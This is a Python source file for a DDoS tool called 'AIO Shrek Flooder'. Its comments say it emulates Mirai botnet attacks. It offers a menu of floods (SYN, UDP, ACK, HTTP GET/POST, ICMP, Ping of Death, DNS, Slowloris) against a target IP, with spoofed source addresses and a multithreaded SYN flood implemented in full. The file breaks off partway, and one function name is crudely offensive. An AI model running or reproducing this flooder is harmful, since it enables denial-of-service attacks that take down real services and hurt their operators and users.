#!/usr/bin/env python3
import sys, time, random, os, socket, argparse, ipaddress, threading, multiprocessing, string
from multiprocessing import Process
#import dns.resolver

# Important: Compile for better performance, it will run not as a script but as a compiled executable!
#sudo python3 -O -m py_compile aio_shrek.flooder.py
#sudo chmod +x aio_shrek_flooder.py
#sudo ./aio_shrek_flooder.py 127.0.0.1 -r 0 

# Styling of the code is an ongoing task: max 79 char line, docstrings, snake_case, etc..

print(r'''                                                            
		      ██████  ██░ ██  ██▀███  ▓█████  ██ ▄█▀
		    ▒██    ▒ ▓██░ ██▒▓██ ▒ ██▒▓█   ▀  ██▄█▒ 
		    ░ ▓██▄   ▒██▀▀██░▓██ ░▄█ ▒▒███   ▓███▄░ 
		      ▒   ██▒░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ 
		    ▒██████▒▒░▓█▒░██▓░██▓ ▒██▒░▒████▒▒██▒ █▄
		    ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒
		    ░ ░▒  ░ ░ ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░
		    ░  ░  ░   ░  ░░ ░  ░░   ░    ░   ░ ░░ ░ 
		        ░   ░  ░  ░   ░        ░  ░░  ░   
		                                        
                           ▄████████  ▄█   ▄██████▄                              
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                         ▀███████████ ███▌ ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    █▀  █▀    ▀██████▀                              
   ▄████████  ▄█        ▄██████▄   ▄██████▄  ████████▄     ▄████████    ▄████████ 
  ███    ███ ███       ███    ███ ███    ███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀  ███       ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄     ███       ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀     ███       ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███        ███       ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████ 
  ███        ███▌    ▄ ███    ███ ███    ███ ███   ▄███   ███    ███   ███    ███ 
  ███        █████▄▄██  ▀██████▀   ▀██████▀  ████████▀    ██████████   ███    ███ 
             ▀                                                         ███    ███ 
	  ''')

#from scapy.all import *
from scapy.layers import *
from scapy.packet import *
from scapy.volatile import *

# This was developed with the purpose of emulating the attacks performed by the MIRAI worm:
#https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack_tcp.c
# This should include those found on Mirai and other attacks that may be possible to observe being executed by other botnets

# Arguments specification
parser = argparse.ArgumentParser()
#parser.add_argument("-d", "--dst_ip", help="Specify a target destination IP address")
parser.add_argument("dst_ip", 
	                help="Specify a target destination IP address")
parser.add_argument("-s", "--src_ip", 
	                help="Specify a source IP address. Default is random.")
parser.add_argument("--multithread", 
	                help="Uses multithreading for concurrent floods.",
	                action="store_true")
parser.add_argument("-f", "--fragmentation", 
	                help="Uses fragmentation for 'TEARING' type floods OR meeting MTU.", 
	                action="store_true")
parser.add_argument("-t", "--interval", 
	                type=float, 
	                help="Specify a time interval between packets (in seconds). Default is 0.")
parser.add_argument("-dp", "--dport", 
	                help="Specify a destination Port. Default is random.")
parser.add_argument("-sp", "--sport", 
	                help="Specify a source Port. Default is random.")
parser.add_argument("-r", "--repeat", 
	                type=int, 
	                help="Specify a number of packets to send. Default is 0. Set 0 to unlimited.")
args = parser.parse_args()


#src_ip = ".".join(map(str, (random.randint(0,254)for i in range(4)))) if args.src_ip is None else args.src_ip # This generator includes any reserved address spaces. As of now, Scapy's built-in generator is being used, although it may be slower or power-consuming than manual generation.
src_ip = RandIP() if args.src_ip is None else args.src_ip
dst_ip = args.dst_ip # Implement address verification

dport = RandShort() if args.dport is None else int(args.dport)
sport = RandShort() if args.sport is None else int(args.sport)

power = args.multithread

frag = args.fragmentation

src_desc = "[random]" if args.src_ip is None else str(args.src_ip)
target_desc = str(dst_ip)

repeat = 0 if args.repeat is None else int(args.repeat)
if repeat < 0: repeat = -repeat

interval = 0 if args.interval is None else int(args.interval)

ua_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
	'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
	'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
	'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
	'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
	'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
	'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
	'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
	'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
	'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
	'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
	'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5',
	'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
	'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a',
	'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2',
	'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0',
	'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
	'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
	'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
	'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
	'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
	'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
	'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
	'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
	'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2',
	'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0',
	'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0',
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
	'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
	'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
	'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
	'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
	'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
	'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
	'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
	'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
	'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
	'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
	'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
	'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
	'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
	'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
	'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
	'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
	'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
	'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
	'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
	'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
	'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
	'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
	'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
	'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5',
	'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
	'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
	'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
	'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
	'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
	'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
	'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
	'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
	'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
	'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
	'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
	'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
	'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
	'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
	'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
	'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
	'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
	'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
	'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
	'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)']

def main():
	if not checkSu():
		sys.exit("Requires super user, exiting..")
	print("\nSource: %s\nTarget: %s" %(src_desc, dst_ip))
	print(r'''                                                            
			  ##############################
			  #       OPTIONS MENU:        #
			  ##############################
			  # 1)  SYN   Flood            #
			  # 2)  UDP   Flood            #
			  # 3)  UDP*  Flood (Plain)    #
			  # 4)  ACK   Flood            #
			  # 5)  ACK*  Flood (3-Way TCP)#
			  # 6)  GET   Flood (HTTP)     #
			  # 7)  POST  Flood (HTTP)     #
			  # 8)  ICMP  Flood (echo-req) #
			  # 9)  ICMP  PoD   (Max. IPv4)#
			  # 10) IKE   Flood (ISAKMP)   #
			  # 11) 6LoWPAN     (Layer 7)  #
			  # 12) DNS   Flood (nxdomain) #
			  # 13) SlowLoris   (HTTP)     #
			  #                            #
			  # 0) Exit                    #
			  ############################## 
	  ''')

	choice = input("Select Flood type:\n>>")

	if choice == '1': # beta
		synFlood(src_ip,dst_ip,repeat,sport,dport,interval,power) 
	elif choice == '2': # beta
		udpFlood(src_ip,dst_ip,repeat)
	elif choice == '3': # beta
		udpPlainFlood(src_ip,dst_ip,repeat,dport)
	elif choice == '4': # beta
		ackFlood(src_ip,dst_ip,repeat,sport,dport,interval,power)
	elif choice == '5': # beta
		postAckFlood(dst_ip,repeat,dport)
	elif choice == '6':
		httpGetFlood()
	elif choice == '7':
		httpPostFlood()
	elif choice == '8': # beta
		pingFlood(src_ip,dst_ip,repeat,interval,power)
	elif choice == '9': # beta
		podFlood(src_ip,dst_ip,repeat,interval,power)
	elif choice == '13':
		slowLoris()
	elif choice == '10':
		udpPlainFlood()
	elif choice == '11':
		sixLowLifeDisabledMidgetPorn()
	elif choice == '12':
		dnsFlood()
	elif choice == '0':
		exit()
	else:
		print("Oopsies, try again..")
		main()
	return 0

#https://scapy.readthedocs.io/en/latest/usage.html
#https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html

# utility to check super user priviledges to use Scapy
def checkSu(): return os.getuid() == 0

#################
#   SYN FLOOD   #
#################

def synFlood(src,dst,times,sport,dport,inter,power): # Add fragmentation?
	def subSynFlood(src,dst,times,sport,dport,inter):
		loopit = 0 if times != 0 else 1
		print("Flooding %s:%d, %d times.." % (dst,dport,times))
		if loopit:
			tic = time.process_time()
			packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=sport,  
				        dport=dport, window=RandShort())
			send(packet, verbose=0, loop=loopit, inter=inter)
			toc = time.process_time() - tic
			print("Flood ended (dur: %f)" % toc)
		else:
			#while 1: #send(packet, loop=1) OR while 1: send(packet)?
			#	packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort(), seq=random.randint(1,9999), window=random.randint(1,9999))
			#	send(packet, verbose=0)
			tic = time.process_time()
			packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=sport,
			            dport=dport, window=RandShort())
			send(packet, verbose=0, loop=loopit, count=times, inter=inter)
			toc = time.process_time() - tic
			print("Flood ended (dur: %f)" % toc)
			
	if power:# Remove multi thread?
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded SYN Flood. Using %s threads" % cpu_count)
			for i in range(0,cpu_count+1):
				thread = threading.Thread(target=subSynFlood,
					                      args=(src,dst,times,sport,dport,inter))
				thread.daemon = True
				#proc = Process(target=subSynFlood,args=(src,dst,times,sport,dport,inter))
				#proc.start()
				#proc.join()
				thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(cpu_count):
				thread = threading.Thread(target=subSynFlood,
					                      args=(src,dst,times,sport,dport,inter))
				thread.daemon = False
				#thread.join()
				thread.stop()
				thread.kill()
				#proc.terminate()
				#proc.stop()
				#proc.kill()
	else:
		print("SYN Flood started!")
		subSynFlood(src,dst,times,sport,dport,inter)
		
	return 0

#################
#   POD FLOOD   #
#################

# Ping of Death (max size of packet, icmp)
def podFlood(src,dst,times,inter,power):# Exceeds MTU, 65000B+ icmp
